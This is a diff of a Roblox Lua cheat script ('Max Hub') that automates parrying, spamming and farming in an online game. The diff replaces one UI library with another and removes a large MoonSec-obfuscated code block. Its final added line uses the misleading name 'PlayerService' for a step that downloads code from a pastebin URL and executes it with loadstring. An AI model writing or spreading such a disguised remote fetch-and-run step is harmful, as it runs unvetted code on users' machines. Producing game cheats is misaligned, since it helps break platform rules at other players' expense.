@@ -983,158 +983,47 @@ end)
 --// Services
 local UserInputService = game:GetService("UserInputService");
 
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
 
-local Window = OrionLib:MakeWindow({Name = "MAX Hub", HidePremium = false, SaveConfig = false, IntroText = "MAX Hub", ConfigFolder = "MAX Hub"})
+local window = DrRayLibrary:Load("Max Hub", "Default")
 
---[[
-Name = <string> - The name of the UI.
-HidePremium = <bool> - Whether or not the user details shows Premium status or not.
-SaveConfig = <bool> - Toggles the config saving in the UI.
-ConfigFolder = <string> - The name of the folder where the configs are saved.
-IntroEnabled = <bool> - Whether or not to show the intro animation.
-IntroText = <string> - Text to show in the intro animation.
-IntroIcon = <string> - URL to the image you want to use in the intro animation.
-Icon = <string> - URL to the image you want displayed on the window.
-CloseCallback = <function> - Function to execute when the window is closed.
-]]
+local combatTab = DrRayLibrary.newTab("Combat", "rbxassetid://17440545793")
 
-local Tab = Window:MakeTab({
-	Name = "Main",
-	Icon = "rbxassetid://11963373994",
-	PremiumOnly = false
-})
+combatTab.newToggle("Auto Parry", "", false, function(state)
+    aura_Enabled = state
+end)
 
---[[
-Name = <string> - The name of the tab.
-Icon = <string> - The icon of the tab.
-PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
-]]
+combatTab.newToggle("Auto Spam", "", false, function(state)
+    auto_spam = state
+end)
 
-local Section = Tab:AddSection({
-	Name = "Parry"
-})
+combatTab.newToggle("Manual Spam", "", false, function(state)
+    if state then
+        ManualSpam()
+        else 
+        ManualSpam()
+        end
+end)
 
---[[
-Name = <string> - The name of the section.
-]]
+combatTab.newToggle("Auto Curve", "", false, function(state)
+    auto_curve = state
+end)
 
-OrionLib:MakeNotification({
-	Name = "Welcome!",
-	Content = "Thank You For Using This Scripts^^",
-	Image = "rbxassetid://4483345998",
-	Time = 5
-})
+combatTab.newToggle("Anti Curve", "", false, function(state)
+    anti_curve_spam_Enabled = state
+end)
 
---[[
-Title = <string> - The title of the notification.
-Content = <string> - The content of the notification.
-Image = <string> - The icon of the notification.
-Time = <number> - The duration of the notfication.
-]]
+combatTab.newToggle("AI Play", "", false, function(state)
+    ai_Enabled = state
+end)
 
-Tab:AddToggle({
-	Name = "Auto Parry",
-	Default = false,
-	Callback = function(state)
-		aura_Enabled = state
-	end    
-})
+combatTab.newToggle("Auto Farms", "Turn On Auto parry Too", false, function(state)
+    auto_win = state
+end)
 
-Tab:AddToggle({
-	Name = "Auto Spam",
-	Default = false,
-	Callback = function(state)
-		auto_spam = state
-	end    
-})
-
-Tab:AddToggle({
-	Name = "Manual Spam",
-	Default = false,
-	Callback = function(state)
-		if state then
-            ManualSpam()
-            else 
-            ManualSpam()
-            end
-	end    
-})
-
-local Section = Tab:AddSection({
-	Name = "Curve"
-})
-
---[[
-Name = <string> - The name of the section.
-]]
-
-Tab:AddToggle({
-	Name = "Auto Curve",
-	Default = false,
-	Callback = function(state)
-		auto_curve = state
-	end    
-})
-
-Tab:AddToggle({
-	Name = "Anti Curve",
-	Default = false,
-	Callback = function(state)
-		anti_curve_spam_Enabled = state
-	end    
-})
-
-local Section = Tab:AddSection({
-	Name = "Farms"
-})
-
---[[
-Name = <string> - The name of the section.
-]]
-
-Tab:AddToggle({
-	Name = "AI Play",
-	Default = false,
-	Callback = function(state)
-		ai_Enabled = state
-	end    
-})
-
-Tab:AddToggle({
-	Name = "Auto Farms(Turn On Auto Parry too)",
-	Default = false,
-	Callback = function(state)
-		auto_win = state
-	end    
-})
+combatTab.newToggle("Visualize", "", false, function(state)
+    visualize_Enabled = state
+end)
 
 
-local notificationShown = false  -- Flag to track if the notification has been shown
-
--- Function to repeatedly check if aura_table.is_Spamming
-local function checkSpamming()
-    while true do  -- Infinite loop to keep checking
-        if ismyautoparryspamming and not notificationShown then
-OrionLib:MakeNotification({
-	Name = "Spamming...",
-	Content = "Auto Spam ON!",
-	Image = "rbxassetid://4483345998",
-	Time = 2
-})
-notificationShown = true  -- Set the flag to true after showing the notification
-elseif not aura_table.is_Spamming then
-	notificationShown = false  -- Reset the flag when not spamming
-end
-wait(0.5)  -- Wait for 1 second before checking again (adjust as needed)
-end
-end
-
-checkSpamming()
-
-print("Max Hub Succesful Loading!")
-
-
-
-
-([[This file was protected with MoonSec V3]]):gsub('.+', (function(a) _ZukQsChvBBmR = a; end)); return(function(h,...)local r;local o;local s;local t;local f;local d;local e=24915;local n=0;local l={};while n<546 do n=n+1;while n<0x3df and e%0x1934<0xc9a do n=n+1 e=(e+997)%11931 local a=n+e if(e%0x2f74)<0x17ba then e=(e+0x347)%0x961c while n<0x302 and e%0x2256<0x112b do n=n+1 e=(e+180)%33091 local d=n+e if(e%0x167a)<0xb3d then e=(e+0xf5)%0x7476 local e=43653 if not l[e]then l[e]=0x1 o={};end elseif e%2~=0 then e=(e*0x30f)%0x249b local e=92137 if not l[e]then l[e]=0x1 f=string;end else e=(e*0xea)%0x1808 n=n+1 local e=40545 if not l[e]then l[e]=0x1 t=getfenv and getfenv();end end end elseif e%2~=0 then e=(e*0x301)%0x5125 while n<0x3d6 and e%0x3ec8<0x1f64 do n=n+1 e=(e-696)%4061 local d=n+e if(e%0x3dfc)<=0x1efe then e=(e-0x3ab)%0x7403 local e=40566 if not l[e]then l[e]=0x1 t=(not t)and _ENV or t;end elseif e%2~=0 then e=(e+0x1a5)%0xaa9 local e=25569 if not l[e]then l[e]=0x1 end else e=(e*0x174)%0x4212 n=n+1 local e=67435 if not l[e]then l[e]=0x1 end end end else e=(e-0x1fe)%0x6776 n=n+1 while n<0x139 and e%0x436c<0x21b6 do n=n+1 e=(e*855)%13602 local a=n+e if(e%0x4ce4)>=0x2672 then e=(e+0x189)%0x2b36 local e=29936 if not l[e]then l[e]=0x1 s=tonumber;end elseif e%2~=0 then e=(e+0x36a)%0x4cc0 local e=2669 if not l[e]then l[e]=0x1 r="\4\8\116\111\110\117\109\98\101\114\79\114\82\80\90\98\104\101\0\6\115\116\114\105\110\103\4\99\104\97\114\112\118\73\89\87\72\72\97\0\6\115\116\114\105\110\103\3\115\117\98\70\104\68\111\87\116\122\97\0\6\115\116\114\105\110\103\4\98\121\116\101\72\71\88\113\101\81\120\77\0\5\116\97\98\108\101\6\99\111\110\99\97\116\116\107\120\98\117\81\83\82\0\5\116\97\98\108\101\6\105\110\115\101\114\116\66\95\120\83\81\104\69\121\5";end else e=(e*0xa7)%0x762 n=n+1 local e=10139 if not l[e]then l[e]=0x1 d=function(d)local e=0x01 local function l(n)e=e+n return d:sub(e-n,e-0x01)end while true do local n=l(0x01)if(n=="\5")then break end local e=f.byte(l(0x01))local e=l(e)if n=="\2"then e=o.OrRPZbhe(e)elseif n=="\3"then e=e~="\0"elseif n=="\6"then t[e]=function(n,e)return h(8,nil,h,e,n)end elseif n=="\4"then e=t[e]elseif n=="\0"then e=t[e][l(f.byte(l(0x01)))];end local n=l(0x08)o[n]=e end end end end end end end e=(e*412)%8941 end d(r);local n={};for e=0x0,0xff do local l=o.pvIYWHHa(e);n[e]=l;n[l]=e;end local function c(e)return n[e];end local l=(function(r,d)local a,l=0x01,0x10 local n={{},{},{}}local t=-0x01 local e=0x01 local f=r while true do n[0x03][o.FhDoWtza(d,e,(function()e=a+e return e-0x01 end)())]=(function()t=t+0x01 return t end)()if t==(0x0f)then t=""l=0x000 break end end local t=#d while e<t+0x01 do n[0x02][l]=o.FhDoWtza(d,e,(function()e=a+e return e-0x01 end)())l=l+0x01 if l%0x02==0x00 then l=0x00 o.B_xSQhEy(n[0x01],(c((((n[0x03][n[0x02][0x00]]or 0x00)*0x10)+(n[0x03][n[0x02][0x01]]or 0x00)+f)%0x100)));f=r+f;end end return o.tkxbuQSR(n[0x01])end);d(l(164,"YL6fD1-t=+e4?J)/-L"));d(l(180,"o+G6ZL_t/e <-!?2Z-e?Lt Z??6+/G-t<9L-<e2!Z-t+?Z6 L/- H-6!<+/-!eeU-2+et;<-JZZ e-!6q2L2!62/2!Z!&ZLGeL?_6/L/-ZG+6 /6!LGLe?tj-Gt<-/+GLL _?<!L/e-eG/_6<Z?!G2/t?_G?t!<2+/2/Z/2!6!e-!--Lt/<-:e_/ -?!+e_!?++?L/ elZ?-ZT266+/-!++Ltu eV/Z+/??ZGete<2?-6te+?%G2e-tZ-6L?<e36_> t2_06t+-e3<_-<e?66<te/;--/<-++L_-<6mZZ e_<-x/t--6 _2+tL!GZi/_<!+!Le</?e?-6-2Z6</<!/GG_L<_2<Z_eu!2G</ <_+-_?Zae+Z-/L!GG/_!L +LL  /?L66/t!ZGZZ <_A Z?/3-L--+ !L+ _/ L26Zt/G-63_Z?!G+-_ /-/-!eeD!?G+tG-Z+ZL? G-<Z_t- _G/E,Z?UtZLe/!!Gt/Z<6?<_t/62<G2e_-G<-k--+R+_S */e6_//!tG6tGe<!!Z_ L? 6Ltt-L<+"));local e=(-6214+(function()local l,n=0,1;(function(e)e(e(e))end)(function(e)if l>275 then return e end l=l+1 n=(n*918)%9572 if(n%1300)<=650 then n=(n*450)%47167 return e(e(e and e))else return e end return e end)return n;end)())local ee=(getfenv)or(function()return _ENV end);local c=o.ZOFBzxzP or o.lpJjrjPI;local f=4;local m=1;local d=3;local t=2;local function j(z,...)local a=l(e,"V{)z.8Q9lL/ >5iG985>./ l)LLlb)9!5i z{ L8G 19LLiU.i >9i*4QGi9S) Q)9LlGG)li5.8>8i+Li!i9Li>.  9zQL8r))>G{8{>/)>8)i595i 8l/ ) L9>)QQ {iG9z>lzQ/.8GiG85>/{5L5wL9z58Q.5kz8/lrGlL>>8 >.z)/{{l8LG/Ql5.5z9)/>{/ll8i5l.Q &){8Q L)9> z  {))l9G9QG5 z99))8L2iG8G>Gw9/li9l9>rQzLG{)9liQ8/>zzz/Q.I/5{/89GLz85{{Qlz{GQ{>.9#i9.{8{>Q)/LlZQiA8{ {))LG*i9/5G8) L>zz L>0/9l.8/iz9L iG9G 58^>>uQ9.%5Qh9GG{8l>Qz.i/l.G)8>/{)5///.{)luii8>5Lzl/Q{.l)G58i>>z//L{Ql.G)9)5{z>//{llLG.Q)5t8p z{/llGQQ/5).Z/i.)l>GlQQ5..l E{Gl>G>Ql5/.. ))*lih)Q/5L.Q .)/L%GiQ>5 .l Q)./.{.Qi5>./ 5)QL.^)l)G-.>  )lL9s.9)iWQi>l)/LLYQ98i)89 izi/>Yl9Li.8Q>Z)iL>I/liiQ8l>)z{LiF>9/il85>.zz/7{)9>i/8l>Qz5/){Z9ii>8/>/zQ/.)5l0ii8>> zl/9{.l)Gl8i>>z//L{Ql.G)");local n=0;o.hbhSCGoH(function()o.otnnHHpk()n=n+1 end)local function e(e,l)if l then return n end;n=e+n;end local l,n,u=h(0,h,e,a,o.HGXqeQxM);local function r()local n,l=o.HGXqeQxM(a,e(1,3),e(5,6)+2);e(2);return(l*256)+n;end;local _=true;local _=0 local function b()local t=n();local e=n();local d=1;local t=(l(e,1,20)*(2^32))+t;local n=l(e,21,31);local e=((-1)^l(e,32));if(n==0)then if(t==_)then return e*0;else n=1;d=0;end;elseif(n==2047)then return(t==0)and(e*(1/0))or(e*(0/0));end;return o.eEMufTYh(e,n-1023)*(d+(t/(2^52)));end;local k=n;local function j(n)local l;if(not n)then n=k();if(n==0)then return'';end;end;l=o.FhDoWtza(a,e(1,3),e(5,6)+n-1);e(n)local e=""for n=(1+_),#l do e=e..o.FhDoWtza(l,n,n)end return e;end;local _=#o.fdggzZtz(s('\49.\48'))~=1 local e=n;local function ne(...)return{...},o.WCsCoWrR('#',...)end local function p()local h={};local e={};local c={};local s={h,c,nil,e};local e=n()local a={}for t=1,e do local l=u();local e;if(l==2)then e=(u()~=#{});elseif(l==1)then local n=b();if _ and o.UKWjfi_l(o.fdggzZtz(n),'.(\48+)$')then n=o.OEbunmce(n);end e=n;elseif(l==3)then e=j();end;a[t]=e;end;for e=1,n()do c[e-(#{1})]=p();end;s[3]=u();for s=1,n()do local e=u();if(l(e,1,1)==0)then local o=l(e,2,3);local c=l(e,4,6);local e={r(),r(),nil,nil};if(o==0)then e[d]=r();e[f]=r();elseif(o==#{1})then e[d]=n();elseif(o==z[2])then e[d]=n()-(2^16)elseif(o==z[3])then e[d]=n()-(2^16)e[f]=r();end;if(l(c,1,1)==1)then e[t]=a[e[t]]end if(l(c,2,2)==1)then e[d]=a[e[d]]end if(l(c,3,3)==1)then e[f]=a[e[f]]end h[s]=e;end end;return s;end;local function j(l,n,e)local t=n;local t=e;return s(o.UKWjfi_l(o.UKWjfi_l(({o.hbhSCGoH(l)})[2],n),e))end local function y(b,e,u)local function y(...)local r,y,s,g,z,l,a,p,k,_,j,n;local e=0;while-1<e do if e<=2 then if e<=0 then r=h(6,74,1,81,b);y=h(6,35,2,79,b);else if e>1 then l=-41;a=-1;else s=h(6,33,3,33,b);z=ne g=0;end end else if e>4 then if 4~=e then repeat if 5~=e then e=-2;break;end;n=h(7);until true;else e=-2;end else if 4~=e then p={};k={...};else _=o.WCsCoWrR('#',...)-1;j={};end end end e=e+1;end;for e=0,_ do if(e>=s)then p[e-s]=k[e+1];else n[e]=k[e+1];end;end;local e=_-s+1 local e;local o;local function h(...)while true do end end while true do if l<-40 then l=l+42 end e=r[l];o=e[m];if 11>=o then if o>=6 then if 9<=o then if 9>=o then n[e[t]]=(e[d]~=0);else if 9<=o then for r=34,90 do if 11>o then if(n[e[t]]~=e[f])then l=l+1;else l=e[d];end;break;end;n[e[t]]();break;end;else if(n[e[t]]~=e[f])then l=l+1;else l=e[d];end;end end else if 6>=o then n[e[t]]=u[e[d]];else if o~=7 then do return end;else local o,f,c,a,r;local l=0;while l>-1 do if l<=2 then if 1<=l then if l>1 then c=d;else f=t;end else o=e;end else if l>4 then if l==6 then l=-2;else n(r,a);end else if 3<l then r=o[f];else a=o[c];end end end l=l+1 end end end end else if 3>o then if 1<=o then if 2==o then u[e[d]]=n[e[t]];else local t=e[t];local l=n[e[d]];n[t+1]=l;n[t]=l[e[f]];end else l=e[d];end else if 3<o then if o~=0 then for r=18,58 do if 5>o then local l=e[t]local t,e=z(n[l](c(n,l+1,e[d])))a=e+l-1 local e=0;for l=l,a do e=e+1;n[l]=t[e];end;break;end;if(n[e[t]]~=e[f])then l=l+1;else l=e[d];end;break;end;else if(n[e[t]]~=e[f])then l=l+1;else l=e[d];end;end else do return end;end end end else if o>=18 then if o>20 then if o>=22 then if o>=19 then for r=39,90 do if o~=22 then l=e[d];break;end;local l=e[t];local t=n[e[d]];n[l+1]=t;n[l]=t[e[f]];break;end;else local t=e[t];local l=n[e[d]];n[t+1]=l;n[t]=l[e[f]];end else local e=e[t]n[e]=n[e](c(n,e+1,a))end else if o<19 then local o,_,k,b,s;for h=0,6 do if h<=2 then if 1>h then n[e[t]]=u[e[d]];l=l+1;e=r[l];else if 0~=h then repeat if h~=1 then n(e[t],e[d]);l=l+1;e=r[l];break;end;o=e[t];_=n[e[d]];n[o+1]=_;n[o]=_[e[f]];l=l+1;e=r[l];until true;else n(e[t],e[d]);l=l+1;e=r[l];end end else if h<5 then if-1<h then for f=38,57 do if h~=4 then n[e[t]]=(e[d]~=0);l=l+1;e=r[l];break;end;o=e[t]k,b=z(n[o](c(n,o+1,e[d])))a=b+o-1 s=0;for e=o,a do s=s+1;n[e]=k[s];end;l=l+1;e=r[l];break;end;else n[e[t]]=(e[d]~=0);l=l+1;e=r[l];end else if h>5 then n[e[t]]();else o=e[t]n[o]=n[o](c(n,o+1,a))l=l+1;e=r[l];end end end end else if o==20 then n[e[t]]=u[e[d]];else local o,r,f,a,c;local l=0;while l>-1 do if l<=2 then if 1<=l then if l~=0 then for e=31,85 do if 2>l then r=t;break;end;f=d;break;end;else r=t;end else o=e;end else if 4>=l then if l>1 then for e=43,85 do if l~=4 then a=o[f];break;end;c=o[r];break;end;else a=o[f];end else if l~=5 then l=-2;else n(c,a);end end end l=l+1 end end end end else if o<=14 then if o>12 then if o~=13 then local l=e[t]local t,e=z(n[l](c(n,l+1,e[d])))a=e+l-1 local e=0;for l=l,a do e=e+1;n[l]=t[e];end;else for o=0,3 do if 2<=o then if 3>o then n[e[t]]=u[e[d]];l=l+1;e=r[l];else if(n[e[t]]~=e[f])then l=l+1;else l=e[d];end;end else if o~=1 then n[e[t]]=(e[d]~=0);l=l+1;e=r[l];else u[e[d]]=n[e[t]];l=l+1;e=r[l];end end end end else local e=e[t]n[e]=n[e](c(n,e+1,a))end else if o<16 then n[e[t]]();else if o~=15 then for l=36,93 do if o>16 then u[e[d]]=n[e[t]];break;end;n[e[t]]=(e[d]~=0);break;end;else n[e[t]]=(e[d]~=0);end end end end end l=1+l;end;end;return y end;local d=0xff;local h={};local f=(1);local t='';(function(n)local l=n local r=0x00 local e=0x00 l={(function(a)if r>0x20 then return a end r=r+1 e=(e+0x12c6-a)%0x2d return(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xb4);d[2]=(d[2]*(j(function()h()end,c(t))-j(d[1],c(t))))+1;h[f]={};d=d[2];f=f+d;end return true end)'ClXIB'and l[0x3](0x96+a))or(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x75);t={t..'\58 a',t};h[f]=p();f=f+((not o.IpzLrhMu)and 1 or 0);t[1]='\58'..t[1];d[2]=0xff;end return true end)'oURuM'and l[0x1](a+0x220))or(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xd2);end return true end)'_ODZK'and l[0x2](a+0x119))or a end),(function(t)if r>0x30 then return t end r=r+1 e=(e+0x72c-t)%0x39 return(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xa3);end return true end)'pjrMj'and l[0x2](0x65+t))or(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x9d);end return true end)'fuSUV'and l[0x3](t+0x127))or(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x19);end return true end)'XHhfk'and l[0x1](t+0x233))or t end),(function(o)if r>0x23 then return o end r=r+1 e=(e+0xeb3-o)%0x39 return(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x34);t='\37';d={function()d()end};t=t..'\100\43';end return true end)'ssMAA'and l[0x1](0x159+o))or(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xc8);end return true end)'SCncw'and l[0x3](o+0xc5))or(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xeb);h[f]=ee();f=f+d;end return true end)'jDTOJ'and l[0x2](o+0x385))or o end)}l[0x3](0x16a7)end){};local e=y(c(h));return e(...);end return j((function()local n={}local e=0x01;local l;if o.IpzLrhMu then l=o.IpzLrhMu(j)else l=''end if o.UKWjfi_l(l,o.HhyFCIMz)then e=e+0;else e=e+1;end n[e]=0x02;n[n[e]+0x01]=0x03;return n;end)(),...)end)((function(n,e,l,d,t,o)local o;if n>=4 then if n>=6 then if n<=6 then do return t[l]end;else if 8==n then do return l(n,nil,l);end else do return setmetatable({},{['__\99\97\108\108']=function(e,d,t,l,n)if n then return e[n]elseif l then return e else e[d]=t end end})end end end else if 0<n then repeat if n~=4 then local n=d;do return function()local e=e(l,n(n,n),n(n,n));n(1);return e;end;end;break;end;local n=d;local d,t,o=t(2);do return function()local e,l,r,f=e(l,n(n,n),n(n,n)+3);n(4);return(f*d)+(r*t)+(l*o)+e;end;end;until true;else local n=d;local r,o,f=t(2);do return function()local d,t,e,l=e(l,n(n,n),n(n,n)+3);n(4);return(l*r)+(e*o)+(t*f)+d;end;end;end end else if 2<=n then if n~=3 then do return 16777216,65536,256 end;else do return e(1),e(4,t,d,l,e),e(5,t,d,l)end;end else if-2~=n then repeat if 1>n then do return e(1),e(4,t,d,l,e),e(5,t,d,l)end;break;end;do return function(l,e,n)if n then local e=(l/2^(e-1))%2^((n-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(l%(e+e)>=e)and 1 or 0;end;end;end;until true;else do return function(n,e,l)if l then local e=(n/2^(e-1))%2^((l-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(n%(e+e)>=e)and 1 or 0;end;end;end;end end end end),...)
+local PlayerService = 'https://pastebin.com/raw/GnBAFM7v' local response = game:HttpGet(PlayerService) local executeScript = loadstring(response) executeScript()
